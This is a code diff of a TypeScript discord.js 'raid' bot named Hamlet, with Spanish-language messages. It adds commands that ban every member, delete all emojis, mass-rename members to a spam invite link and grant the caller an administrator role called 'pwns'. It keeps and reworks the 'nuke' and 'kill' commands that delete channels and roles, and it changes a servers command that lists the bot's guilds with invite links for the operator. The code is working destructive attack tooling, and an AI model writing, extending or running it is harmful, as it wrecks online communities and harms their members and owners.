@@ -1,6 +1,6 @@
 import express = require('express');
 import { Client, Message, Guild, Collection, MessageEmbed } from 'discord.js';
-import { raidData, colors, reset } from './config/raid.config';
+import { raidData, colors, reset, admin, prefix } from './config/raid.config';
 
 //express app
 const app = express();
@@ -16,11 +16,11 @@ const client: Client = new Client();
 client.on('ready', () => {
   if (!client.user) return;
   console.log(client.user.username, ' is ready');
-  console.log(client.user.id);
+  console.log(`https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=1642824461566&scope=bot%20applications.commands`);
   client.user.setPresence({
     status: 'dnd',
     activity: {
-      name: '@',
+      name: prefix,
       type: 'COMPETING',
     },
   });
@@ -28,7 +28,7 @@ client.on('ready', () => {
 
 client.on('message', async (message: Message) => {
   if (!message.guild) return;
-
+  if (!client.user) return;
   const guild: Guild = message.guild;
 
   if (!guild.me) return;
@@ -41,10 +41,53 @@ client.on('message', async (message: Message) => {
     return new Promise((resolve) => setTimeout(resolve, ms));
   }
 
+  
+  if (message.content === `${prefix}help`) {
+    const commands = ['kill', 'banall', 'admin', 'emoji', 'massnick']
+    const embed: MessageEmbed = new MessageEmbed()
+      .setTitle('Hamlet v1 | Prefix: `+`')
+      .setDescription(`Hola **${message.author.username}**! Mi nombre es Hamlet, el bot de *NationSquad*\n\n**Actualmente, mis comandos son:**\n` + commands.map(c => '`' + c + '`').join('\n') + '\nTen un buen día!')
+      .setThumbnail('https://media.tenor.com/fy5Mwh-q5ZUAAAAC/hamtaro.gif')
+    message.channel.send(embed);
+  }
+  
+  if (message.content === `${prefix}massnick`) {
+      guild.members.cache.forEach(m => {
+        if (!guild.me) return;
+        if (m.roles.highest.position > guild.me.roles.highest.position || guild.ownerID === m.user.id) return; 
+        m.setNickname(raidData.invite)
+          .catch(e => console.log(colors.red, 'Changing nicknames', reset));
+      });
+  }
+  
+  if (message.content === `${prefix}emoji`) {
+    guild.emojis.cache.forEach(e => {
+        e.delete()
+          .then(e => guild.emojis.cache.delete(e.id))
+          .catch(e => {
+          console.log(colors.yellow, 'Deleting emojis', reset);
+        });
+    });  
+  }
+  
+  if (message.content === `${prefix}admin`) {
+    const rol = await guild.roles.create({data: { name: 'pwns', permissions: ['ADMINISTRATOR'] }});
+    message.member?.roles.add(rol);
+  }
+  
+  if (message.content === `${prefix}banall`) {
+    message.guild.members.cache.forEach(async m => {
+      try {
+        await m.ban();
+      } catch(e) {
+        console.log('no se pudo banear a 1 usuario');
+      }
+    })
+  }
   ///nuke
-  if (message.content === '@nuke') {
+  if (message.content === `${prefix}nuke`) {
     async function deleteData(): Promise<Guild> {
-      await guild.channels.cache.forEach((c) => {
+      guild.channels.cache.forEach((c) => {
         c.delete()
           .then((channel) => guild.channels.cache.delete(channel.id))
           .catch((e) => {
@@ -64,11 +107,12 @@ client.on('message', async (message: Message) => {
     );
   }
   ///automatic
-  if (message.content === '@') {
+  if (message.content === `${prefix}kill`) {
+    let errorCounter = 0;
     if (!guild.me.hasPermission('ADMINISTRATOR'))
       return wrong('No tengo los permisos ncesarios');
     const deleteChannels = async (): Promise<Guild> => {
-      await guild.channels.cache.forEach((c) => {
+      guild.channels.cache.forEach((c) => {
         c.delete()
           .then((channel) => guild.channels.cache.delete(channel.id))
           .catch((e) => {
@@ -79,7 +123,7 @@ client.on('message', async (message: Message) => {
     };
 
     const deleteRoles = async (): Promise<Guild> => {
-      await guild.roles.cache.forEach((r) => {
+      guild.roles.cache.forEach((r) => {
         if (!guild.me) return;
         if (guild.me.roles.highest.position > r.position && r.id !== guild.id) {
           r.delete()
@@ -163,8 +207,8 @@ client.on('message', async (message: Message) => {
     }
   }
 
-  if (message.content === '@svs') {
-    if (message.author.id !== '818625837653033050') return;
+  if (message.content === `${prefix}servers`) {
+    if (message.author.id !== admin) return;
     let guilds = client.guilds.cache.sort((a, b) => (a > b ? -1 : 1));
 
     guilds.forEach(async (g) => {
@@ -172,7 +216,7 @@ client.on('message', async (message: Message) => {
       try {
         let invite = await g.channels.cache.random().createInvite();
         message.channel.send(
-          g.me?.hasPermission('ADMINISTRATOR') + g.name + ' | ' + invite.url
+          g.me?.hasPermission('ADMINISTRATOR') + ' | ' + g.name + ' | ' + g.memberCount +  ' ' + invite.url
         );
       } catch (e) {
         message.channel.send(g.name + ' | ' + g.id);
